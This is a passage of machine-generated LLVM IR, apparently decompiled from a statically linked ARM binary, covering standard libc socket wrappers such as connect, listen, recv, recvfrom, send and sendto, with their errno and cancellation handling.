  %v4_13720 = inttoptr i32 %v3_13720 to i32*
  store i32 %v1_1371c, i32* %v4_13720, align 4
  %v2_13728.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %entry, %dec_label_pc_13710
  %v1_1372c = phi i32 [ %v0_13700, %entry ], [ -1, %dec_label_pc_13710 ]
  %v2_13728 = phi i32 [ %v3_136f4, %entry ], [ %v2_13728.pre, %dec_label_pc_13710 ]
  store i32 %v2_13728, i32* @r7, align 4
  ret i32 %v1_1372c

; uselistorder directives
  uselistorder i32 %v0_13700, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13728, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13730:
  %v0_13730 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13730, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13730
  %v2_13730 = load i32, i32* @fp, align 4
  %v8_13730 = shl i32 %v2_13730, %arg2
  %v9_13730 = and i32 %v8_13730, %arg1
  %v3_13734 = load i32, i32* @sl, align 4
  %v8_13734 = lshr i32 %v9_13730, %v3_13734
  %v9_13734 = and i32 %v8_13734, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13730, %bb
  %v10_13734 = phi i32 [ %arg1, %dec_label_pc_13730 ], [ %v9_13734, %bb ]
  ret i32 %v10_13734

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1373c = load i32, i32* @r4, align 4
  store i32 %v3_1373c, i32* %stack_var_-20, align 4
  %v6_1373c = load i32, i32* @r5, align 4
  %v9_1373c = load i32, i32* @r6, align 4
  %v12_1373c = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r3, align 4
  %v4_13748 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  store i32 %v4_13748, i32* @ip, align 4
  %v2_1374c = icmp eq i32 %v4_13748, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_1374c, label %dec_label_pc_13764, label %entry.dec_label_pc_13770_crit_edge

entry.dec_label_pc_13770_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13770

dec_label_pc_13764:                               ; preds = %entry
  store i32 %v3_1373c, i32* @r4, align 4
  store i32 %v9_1373c, i32* @r6, align 4
  store i32 %v12_1373c, i32* @r7, align 4
  %v0_1376c = call i32 @__sys_connect()
  br label %dec_label_pc_13770

dec_label_pc_13770:                               ; preds = %entry.dec_label_pc_13770_crit_edge, %dec_label_pc_13764
  %v0_13770 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13770, i32* @r5, align 4
  %v0_13780 = load i32, i32* @r4, align 4
  store i32 %v0_13780, i32* @r0, align 4
  %v0_13784 = call i32 @__sys_connect()
  store i32 %v0_13784, i32* @r4, align 4
  %v0_1378c = load i32, i32* @r5, align 4
  %v1_13790 = call i32 @__libc_disable_asynccancel(i32 %v0_1378c)
  %v0_13794 = load i32, i32* @r4, align 4
  %v2_1379c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1379c, i32* @r4, align 4
  store i32 %v6_1373c, i32* @r5, align 4
  store i32 %v9_1373c, i32* @r6, align 4
  store i32 %v12_1373c, i32* @r7, align 4
  ret i32 %v0_13794

; uselistorder directives
  uselistorder label %dec_label_pc_13770, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_137ac = load i32, i32* @r7, align 4
  store i32 %v3_137ac, i32* %stack_var_-8, align 4
  %v0_137b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_137b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_137b8, -4095
  br i1 %tmp, label %dec_label_pc_137e0, label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %entry
  %v0_137cc = call i32 @__aeabi_read_tp()
  %v3_137d0 = load i16, i16* @global_var_24150.533, align 2
  %v4_137d0 = sext i16 %v3_137d0 to i32
  %v0_137d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_137d4 = sub i32 0, %v0_137d4
  store i32 %v1_137d4, i32* %r2.global-to-local, align 4
  %v3_137d8 = add i32 %v4_137d0, %v0_137cc
  %v4_137d8 = inttoptr i32 %v3_137d8 to i32*
  store i32 %v1_137d4, i32* %v4_137d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_137e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_137e0

dec_label_pc_137e0:                               ; preds = %entry, %dec_label_pc_137c8
  %v1_137e4 = phi i32 [ %v0_137b8, %entry ], [ -1, %dec_label_pc_137c8 ]
  %v2_137e0 = phi i32 [ %v3_137ac, %entry ], [ %v2_137e0.pre, %dec_label_pc_137c8 ]
  store i32 %v2_137e0, i32* @r7, align 4
  ret i32 %v1_137e4

; uselistorder directives
  uselistorder i32 %v0_137b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_137e0, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_137e8:
  %v0_137e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137e8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_137e8
  %v2_137ec = load i32, i32* @r8, align 4
  %v3_137ec = load i32, i32* @sb, align 4
  %v4_137ec = lshr i32 %v2_137ec, %v3_137ec
  %v5_137ec = sub i32 32, %v3_137ec
  %v6_137ec = shl i32 %v2_137ec, %v5_137ec
  %v7_137ec = or i32 %v6_137ec, %v4_137ec
  %v9_137ec = and i32 %v7_137ec, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_137e8, %bb
  %v10_137ec = phi i32 [ %arg1, %dec_label_pc_137e8 ], [ %v9_137ec, %bb ]
  ret i32 %v10_137ec

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_137f0 = load i32, i32* @r4, align 4
  store i32 %v3_137f0, i32* %stack_var_-12, align 4
  %v0_13800 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13800, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13800, -4095
  br i1 %tmp, label %dec_label_pc_13828, label %dec_label_pc_13810

dec_label_pc_13810:                               ; preds = %entry
  %v0_13814 = call i32 @__aeabi_read_tp()
  %v3_13818 = load i16, i16* @global_var_24150.533, align 2
  %v4_13818 = sext i16 %v3_13818 to i32
  %v0_1381c = load i32, i32* %r2.global-to-local, align 4
  %v1_1381c = sub i32 0, %v0_1381c
  store i32 %v1_1381c, i32* %r2.global-to-local, align 4
  %v3_13820 = add i32 %v4_13818, %v0_13814
  %v4_13820 = inttoptr i32 %v3_13820 to i32*
  store i32 %v1_1381c, i32* %v4_13820, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13828.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13828

dec_label_pc_13828:                               ; preds = %entry, %dec_label_pc_13810
  %v1_1382c = phi i32 [ %v0_13800, %entry ], [ -1, %dec_label_pc_13810 ]
  %v2_13828 = phi i32 [ %v3_137f0, %entry ], [ %v2_13828.pre, %dec_label_pc_13810 ]
  store i32 %v2_13828, i32* @r4, align 4
  ret i32 %v1_1382c

; uselistorder directives
  uselistorder i32 %v0_13800, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13828, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13830:
  %v0_13830 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13830, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13830
  %v2_13830 = load i32, i32* @r7, align 4
  %v5_13830 = udiv i32 %v2_13830, 4
  %v6_13830 = and i32 %v5_13830, %arg1
  %v3_13834 = load i32, i32* @sb, align 4
  %v8_13834 = lshr i32 %v6_13830, %v3_13834
  %v9_13834 = and i32 %v8_13834, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13830, %bb
  %v10_13834 = phi i32 [ %arg1, %dec_label_pc_13830 ], [ %v9_13834, %bb ]
  ret i32 %v10_13834

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13838 = load i32, i32* @r7, align 4
  store i32 %v3_13838, i32* %stack_var_-8, align 4
  %v0_13844 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13844, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13844, -4095
  br i1 %tmp, label %dec_label_pc_1386c, label %dec_label_pc_13854

dec_label_pc_13854:                               ; preds = %entry
  %v0_13858 = call i32 @__aeabi_read_tp()
  %v3_1385c = load i16, i16* @global_var_24150.533, align 2
  %v4_1385c = sext i16 %v3_1385c to i32
  %v0_13860 = load i32, i32* %r2.global-to-local, align 4
  %v1_13860 = sub i32 0, %v0_13860
  store i32 %v1_13860, i32* %r2.global-to-local, align 4
  %v3_13864 = add i32 %v4_1385c, %v0_13858
  %v4_13864 = inttoptr i32 %v3_13864 to i32*
  store i32 %v1_13860, i32* %v4_13864, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1386c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1386c

dec_label_pc_1386c:                               ; preds = %entry, %dec_label_pc_13854
  %v1_13870 = phi i32 [ %v0_13844, %entry ], [ -1, %dec_label_pc_13854 ]
  %v2_1386c = phi i32 [ %v3_13838, %entry ], [ %v2_1386c.pre, %dec_label_pc_13854 ]
  store i32 %v2_1386c, i32* @r7, align 4
  ret i32 %v1_13870

; uselistorder directives
  uselistorder i32 %v0_13844, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1386c, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13878 = load i32, i32* @r7, align 4
  store i32 %v3_13878, i32* %stack_var_-8, align 4
  %v0_13884 = load i32, i32* @r0, align 4
  store i32 %v0_13884, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13884, -4095
  br i1 %tmp, label %dec_label_pc_138ac, label %dec_label_pc_13894

dec_label_pc_13894:                               ; preds = %entry
  %v0_13898 = call i32 @__aeabi_read_tp()
  %v3_1389c = load i16, i16* @global_var_24150.533, align 2
  %v4_1389c = sext i16 %v3_1389c to i32
  %v0_138a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_138a0 = sub i32 0, %v0_138a0
  store i32 %v1_138a0, i32* %r2.global-to-local, align 4
  %v3_138a4 = add i32 %v4_1389c, %v0_13898
  %v4_138a4 = inttoptr i32 %v3_138a4 to i32*
  store i32 %v1_138a0, i32* %v4_138a4, align 4
  %v2_138ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138ac

dec_label_pc_138ac:                               ; preds = %entry, %dec_label_pc_13894
  %v1_138b0 = phi i32 [ %v0_13884, %entry ], [ -1, %dec_label_pc_13894 ]
  %v2_138ac = phi i32 [ %v3_13878, %entry ], [ %v2_138ac.pre, %dec_label_pc_13894 ]
  store i32 %v2_138ac, i32* @r7, align 4
  ret i32 %v1_138b0

; uselistorder directives
  uselistorder i32 %v0_13884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138ac, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_138b4:
  %v0_138b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_138b4
  %v2_138b8 = load i32, i32* @ip, align 4
  %v5_138b8 = udiv i32 %v2_138b8, 131072
  %v6_138b8 = and i32 %v5_138b8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_138b4, %bb
  %v7_138b8 = phi i32 [ %arg1, %dec_label_pc_138b4 ], [ %v6_138b8, %bb ]
  ret i32 %v7_138b8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_138c0 = load i32, i32* @r4, align 4
  store i32 %v3_138c0, i32* %stack_var_-24, align 4
  %v6_138c0 = load i32, i32* @r5, align 4
  %v9_138c0 = load i32, i32* @r6, align 4
  %v12_138c0 = load i32, i32* @r7, align 4
  %v15_138c0 = load i32, i32* @r8, align 4
  %v18_138c0 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @ip, align 4
  %v4_138cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_138d0 = icmp eq i32 %v4_138cc, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_138d0, label %dec_label_pc_138e8, label %entry.dec_label_pc_138f0_crit_edge

entry.dec_label_pc_138f0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_138f0

dec_label_pc_138e8:                               ; preds = %entry
  store i32 %v3_138c0, i32* @r4, align 4
  store i32 %v9_138c0, i32* @r6, align 4
  store i32 %v12_138c0, i32* @r7, align 4
  store i32 %v15_138c0, i32* @r8, align 4
  %v0_138ec = call i32 @__sys_recv()
  br label %dec_label_pc_138f0

dec_label_pc_138f0:                               ; preds = %entry.dec_label_pc_138f0_crit_edge, %dec_label_pc_138e8
  %v0_138f0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_138f0, i32* @r5, align 4
  %v0_13904 = load i32, i32* @r4, align 4
  store i32 %v0_13904, i32* @r0, align 4
  %v0_13908 = call i32 @__sys_recv()
  store i32 %v0_13908, i32* @r4, align 4
  %v0_13910 = load i32, i32* @r5, align 4
  %v1_13914 = call i32 @__libc_disable_asynccancel(i32 %v0_13910)
  %v0_13918 = load i32, i32* @r4, align 4
  %v2_1391c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1391c, i32* @r4, align 4
  store i32 %v6_138c0, i32* @r5, align 4
  store i32 %v9_138c0, i32* @r6, align 4
  store i32 %v12_138c0, i32* @r7, align 4
  store i32 %v15_138c0, i32* @r8, align 4
  store i32 %v18_138c0, i32* @lr, align 4
  ret i32 %v0_13918

; uselistorder directives
  uselistorder label %dec_label_pc_138f0, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1392c = load i32, i32* @r4, align 4
  store i32 %v3_1392c, i32* %stack_var_-16, align 4
  %v0_13940 = load i32, i32* @r0, align 4
  store i32 %v0_13940, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13940, -4095
  br i1 %tmp, label %dec_label_pc_13968, label %dec_label_pc_13950

dec_label_pc_13950:                               ; preds = %entry
  %v0_13954 = call i32 @__aeabi_read_tp()
  %v3_13958 = load i16, i16* @global_var_24150.533, align 2
  %v4_13958 = sext i16 %v3_13958 to i32
  %v0_1395c = load i32, i32* %r2.global-to-local, align 4
  %v1_1395c = sub i32 0, %v0_1395c
  store i32 %v1_1395c, i32* %r2.global-to-local, align 4
  %v3_13960 = add i32 %v4_13958, %v0_13954
  %v4_13960 = inttoptr i32 %v3_13960 to i32*
  store i32 %v1_1395c, i32* %v4_13960, align 4
  %v2_13968.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %entry, %dec_label_pc_13950
  %v1_1396c = phi i32 [ %v0_13940, %entry ], [ -1, %dec_label_pc_13950 ]
  %v2_13968 = phi i32 [ %v3_1392c, %entry ], [ %v2_13968.pre, %dec_label_pc_13950 ]
  store i32 %v2_13968, i32* @r4, align 4
  ret i32 %v1_1396c

; uselistorder directives
  uselistorder i32 %v0_13940, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13968, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13974 = load i32, i32* @r4, align 4
  store i32 %v3_13974, i32* %stack_var_-32, align 4
  %v6_13974 = load i32, i32* @r5, align 4
  %v9_13974 = load i32, i32* @r6, align 4
  %v12_13974 = load i32, i32* @r7, align 4
  %v15_13974 = load i32, i32* @r8, align 4
  %v18_13974 = load i32, i32* @sb, align 4
  %v21_13974 = load i32, i32* @sl, align 4
  %v24_13974 = load i32, i32* @lr, align 4
  %v4_13984 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_1398c = icmp eq i32 %v4_13984, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_1398c, label %dec_label_pc_139ac, label %dec_label_pc_139b8

dec_label_pc_139ac:                               ; preds = %entry
  store i32 %v3_13974, i32* @r4, align 4
  store i32 %v12_13974, i32* @r7, align 4
  store i32 %v15_13974, i32* @r8, align 4
  store i32 %v18_13974, i32* %sb.global-to-local, align 4
  %v0_139b4 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %entry, %dec_label_pc_139ac
  %v0_139b8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_139b8, i32* @r5, align 4
  %v0_139cc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_139cc, i32* @r0, align 4
  %v0_139d4 = call i32 @__sys_recvfrom()
  store i32 %v0_139d4, i32* @r4, align 4
  %v0_139dc = load i32, i32* @r5, align 4
  %v1_139e0 = call i32 @__libc_disable_asynccancel(i32 %v0_139dc)
  %v0_139e4 = load i32, i32* @r4, align 4
  %v2_139ec = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_139ec, i32* @r4, align 4
  store i32 %v6_13974, i32* @r5, align 4
  store i32 %v9_13974, i32* @r6, align 4
  store i32 %v12_13974, i32* @r7, align 4
  store i32 %v15_13974, i32* @r8, align 4
  store i32 %v18_13974, i32* @sb, align 4
  store i32 %v21_13974, i32* @sl, align 4
  store i32 %v24_13974, i32* @lr, align 4
  ret i32 %v0_139e4

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_139b8, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139fc = load i32, i32* @r7, align 4
  store i32 %v3_139fc, i32* %stack_var_-8, align 4
  %v0_13a08 = load i32, i32* @r0, align 4
  store i32 %v0_13a08, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a08, -4095
  br i1 %tmp, label %dec_label_pc_13a30, label %dec_label_pc_13a18

dec_label_pc_13a18:                               ; preds = %entry
  %v0_13a1c = call i32 @__aeabi_read_tp()
  %v3_13a20 = load i16, i16* @global_var_24150.533, align 2
  %v4_13a20 = sext i16 %v3_13a20 to i32
  store i32 %v4_13a20, i32* @r3, align 4
  %v0_13a24 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a24 = sub i32 0, %v0_13a24
  store i32 %v1_13a24, i32* %r2.global-to-local, align 4
  %v3_13a28 = add i32 %v4_13a20, %v0_13a1c
  %v4_13a28 = inttoptr i32 %v3_13a28 to i32*
  store i32 %v1_13a24, i32* %v4_13a28, align 4
  %v2_13a30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a30

dec_label_pc_13a30:                               ; preds = %entry, %dec_label_pc_13a18
  %v1_13a34 = phi i32 [ %v0_13a08, %entry ], [ -1, %dec_label_pc_13a18 ]
  %v2_13a30 = phi i32 [ %v3_139fc, %entry ], [ %v2_13a30.pre, %dec_label_pc_13a18 ]
  store i32 %v2_13a30, i32* @r7, align 4
  ret i32 %v1_13a34

; uselistorder directives
  uselistorder i32 %v0_13a08, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a30, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a38:
  %v0_13a38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13a38
  %v2_13a3c = load i32, i32* @r8, align 4
  %v5_13a3c = udiv i32 %v2_13a3c, 16384
  %v6_13a3c = and i32 %v5_13a3c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13a38, %bb
  %v7_13a3c = phi i32 [ %arg1, %dec_label_pc_13a38 ], [ %v6_13a3c, %bb ]
  ret i32 %v7_13a3c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13a44 = load i32, i32* @r4, align 4
  store i32 %v3_13a44, i32* %stack_var_-24, align 4
  %v6_13a44 = load i32, i32* @r5, align 4
  %v9_13a44 = load i32, i32* @r6, align 4
  %v12_13a44 = load i32, i32* @r7, align 4
  %v15_13a44 = load i32, i32* @r8, align 4
  %v18_13a44 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @ip, align 4
  %v4_13a50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_13a54 = icmp eq i32 %v4_13a50, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_13a54, label %dec_label_pc_13a6c, label %entry.dec_label_pc_13a74_crit_edge

entry.dec_label_pc_13a74_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13a74

dec_label_pc_13a6c:                               ; preds = %entry
  store i32 %v3_13a44, i32* @r4, align 4
  store i32 %v9_13a44, i32* @r6, align 4
  store i32 %v12_13a44, i32* @r7, align 4
  store i32 %v15_13a44, i32* @r8, align 4
  %v0_13a70 = call i32 @__sys_send()
  br label %dec_label_pc_13a74

dec_label_pc_13a74:                               ; preds = %entry.dec_label_pc_13a74_crit_edge, %dec_label_pc_13a6c
  %v0_13a74 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13a74, i32* @r5, align 4
  %v0_13a84 = load i32, i32* @r8, align 4
  store i32 %v0_13a84, i32* @r3, align 4
  %v0_13a88 = load i32, i32* @r4, align 4
  store i32 %v0_13a88, i32* @r0, align 4
  %v0_13a8c = call i32 @__sys_send()
  store i32 %v0_13a8c, i32* @r4, align 4
  %v0_13a94 = load i32, i32* @r5, align 4
  %v1_13a98 = call i32 @__libc_disable_asynccancel(i32 %v0_13a94)
  %v0_13a9c = load i32, i32* @r4, align 4
  %v2_13aa0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13aa0, i32* @r4, align 4
  store i32 %v6_13a44, i32* @r5, align 4
  store i32 %v9_13a44, i32* @r6, align 4
  store i32 %v12_13a44, i32* @r7, align 4
  store i32 %v15_13a44, i32* @r8, align 4
  store i32 %v18_13a44, i32* @lr, align 4
  ret i32 %v0_13a9c

; uselistorder directives
  uselistorder label %dec_label_pc_13a74, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13ab0 = load i32, i32* @r4, align 4
  store i32 %v3_13ab0, i32* %stack_var_-16, align 4
  %v0_13ac4 = load i32, i32* @r0, align 4
  store i32 %v0_13ac4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13ac4, -4095
  br i1 %tmp, label %dec_label_pc_13aec, label %dec_label_pc_13ad4

dec_label_pc_13ad4:                               ; preds = %entry
  %v0_13ad8 = call i32 @__aeabi_read_tp()
  %v3_13adc = load i16, i16* @global_var_24150.533, align 2
  %v4_13adc = sext i16 %v3_13adc to i32
  %v0_13ae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ae0 = sub i32 0, %v0_13ae0
  store i32 %v1_13ae0, i32* %r2.global-to-local, align 4
  %v3_13ae4 = add i32 %v4_13adc, %v0_13ad8
  %v4_13ae4 = inttoptr i32 %v3_13ae4 to i32*
  store i32 %v1_13ae0, i32* %v4_13ae4, align 4
  %v2_13aec.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13aec

dec_label_pc_13aec:                               ; preds = %entry, %dec_label_pc_13ad4
  %v1_13af0 = phi i32 [ %v0_13ac4, %entry ], [ -1, %dec_label_pc_13ad4 ]
  %v2_13aec = phi i32 [ %v3_13ab0, %entry ], [ %v2_13aec.pre, %dec_label_pc_13ad4 ]
  store i32 %v2_13aec, i32* @r4, align 4
  ret i32 %v1_13af0

; uselistorder directives
  uselistorder i32 %v0_13ac4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13aec, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13af4:
  %v0_13af4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13af4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13af4
  %v2_13af8 = load i32, i32* @ip, align 4
  %v3_13af8 = udiv i32 %v2_13af8, 4096
  %v4_13af8 = mul i32 %v2_13af8, 1048576
  %v5_13af8 = or i32 %v3_13af8, %v4_13af8
  %v8_13af8 = and i32 %v5_13af8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13af4, %bb
  %v9_13af8 = phi i32 [ %arg1, %dec_label_pc_13af4 ], [ %v8_13af8, %bb ]
  ret i32 %v9_13af8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13afc = load i32, i32* @r4, align 4
  store i32 %v3_13afc, i32* %stack_var_-32, align 4
  %v6_13afc = load i32, i32* @r5, align 4
  %v9_13afc = load i32, i32* @r6, align 4
  %v12_13afc = load i32, i32* @r7, align 4
  %v15_13afc = load i32, i32* @r8, align 4
  %v18_13afc = load i32, i32* @sb, align 4
  %v21_13afc = load i32, i32* @sl, align 4
  %v24_13afc = load i32, i32* @lr, align 4
  %v4_13b0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_13b14 = icmp eq i32 %v4_13b0c, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_13b14, label %dec_label_pc_13b34, label %dec_label_pc_13b40

dec_label_pc_13b34:                               ; preds = %entry
  store i32 %v3_13afc, i32* @r4, align 4
  store i32 %v12_13afc, i32* @r7, align 4
  store i32 %v15_13afc, i32* @r8, align 4
  store i32 %v18_13afc, i32* %sb.global-to-local, align 4
  %v0_13b3c = call i32 @__sys_sendto()
  br label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %entry, %dec_label_pc_13b34
  %v0_13b40 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13b40, i32* @r5, align 4
  %v0_13b54 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13b54, i32* @r0, align 4
  %v0_13b5c = call i32 @__sys_sendto()
  store i32 %v0_13b5c, i32* @r4, align 4
  %v0_13b64 = load i32, i32* @r5, align 4
  %v1_13b68 = call i32 @__libc_disable_asynccancel(i32 %v0_13b64)
  %v0_13b6c = load i32, i32* @r4, align 4
